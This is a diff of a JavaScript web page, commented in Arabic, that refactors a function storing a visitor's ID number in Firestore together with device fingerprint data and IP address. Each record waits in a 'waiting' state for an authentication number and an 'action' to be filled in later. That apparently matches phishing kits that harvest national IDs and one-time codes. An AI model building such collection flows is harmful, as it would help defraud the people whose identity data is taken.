@@ -523,59 +523,77 @@
         }
         
         // ========== دالة حفظ رقم الهوية في Firebase ==========
-        async function saveIdNumberToFirebase(idNumber, rememberMe) {
-            updateProgress(30, 'جاري حفظ رقم الهوية...');
-            
-            try {
-                // التأكد من أن Firebase مهيئ
-                const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
-                
-                if (!db) {
-                    throw new Error('خدمة Firestore غير متاحة');
-                }
-                
-                // جمع بيانات المستخدم
-                const userData = {
-                    idNumber: idNumber,
-                    rememberMe: rememberMe,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    screenSize: `${window.screen.width}x${window.screen.height}`,
-                    language: navigator.language,
-                    browser: {
-                        name: navigator.appName,
-                        version: navigator.appVersion,
-                        platform: navigator.platform
-                    },
-                    ipAddress: await getClientIP(),
-                    status: 'waiting', // حالة الانتظار فقط
-                    source: 'apply_page',
-                    storageType: 'firebase_only',
-                    waiting: true, // المستخدم في حالة انتظار
-                    authNumber: null, // رقم المصادقة فارغ في البداية
-                    action: null, // الإجراء فارغ في البداية
-                    authStatus: 'pending' // حالة المصادقة: في الانتظار
-                };
-                
-                updateProgress(50, 'جاري إنشاء السجل...');
-                
-                // حفظ في Firestore فقط
-                const recordRef = await db.collection('id_numbers').add({
-                    ...userData,
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                    syncStatus: 'synced'
-                });
-                
-                console.log('✅ تم حفظ رقم الهوية في Firebase:', recordRef.id);
-                updateProgress(70, 'تم حفظ رقم الهوية بنجاح');
-                
-                return recordRef.id;
-                
-            } catch (error) {
-                console.error('❌ خطأ في حفظ رقم الهوية:', error);
-                throw error;
-            }
+       // ========== دالة حفظ رقم الهوية في Firebase ==========
+async function saveIdNumberToFirebase(idNumber, rememberMe) {
+    updateProgress(30, 'جاري حفظ رقم الهوية...');
+    
+    try {
+        // طريقة 1: استخدام db مباشرة من firebase
+        let db = null;
+        
+        // المحاولة الأولى: من firebase مباشرة
+        if (typeof firebase !== 'undefined' && firebase.firestore) {
+            db = firebase.firestore();
         }
+        
+        // المحاولة الثانية: من window.firebaseDb
+        if (!db && window.firebaseDb) {
+            db = window.firebaseDb;
+        }
+        
+        // المحاولة الثالثة: من window.firebaseServices
+        if (!db && window.firebaseServices && window.firebaseServices.db) {
+            db = window.firebaseServices.db();
+        }
+        
+        if (!db) {
+            throw new Error('خدمة Firestore غير متاحة');
+        }
+        
+        console.log('✅ Firestore متاح:', !!db);
+        
+        // جمع بيانات المستخدم
+        const userData = {
+            idNumber: idNumber,
+            rememberMe: rememberMe,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language,
+            browser: {
+                name: navigator.appName,
+                version: navigator.appVersion,
+                platform: navigator.platform
+            },
+            ipAddress: await getClientIP(),
+            status: 'waiting',
+            source: 'apply_page',
+            storageType: 'firebase_only',
+            waiting: true,
+            authNumber: null,
+            action: null,
+            authStatus: 'pending'
+        };
+        
+        updateProgress(50, 'جاري إنشاء السجل...');
+        
+        // حفظ في Firestore
+        const recordRef = await db.collection('id_numbers').add({
+            ...userData,
+            createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+            syncStatus: 'synced'
+        });
+        
+        console.log('✅ تم حفظ رقم الهوية في Firebase:', recordRef.id);
+        updateProgress(70, 'تم حفظ رقم الهوية بنجاح');
+        
+        return recordRef.id;
+        
+    } catch (error) {
+        console.error('❌ خطأ في حفظ رقم الهوية:', error);
+        throw error;
+    }
+}
         
         // ========== التحقق من رقم المصادقة ==========
         async function checkForAuthNumber(recordId) {
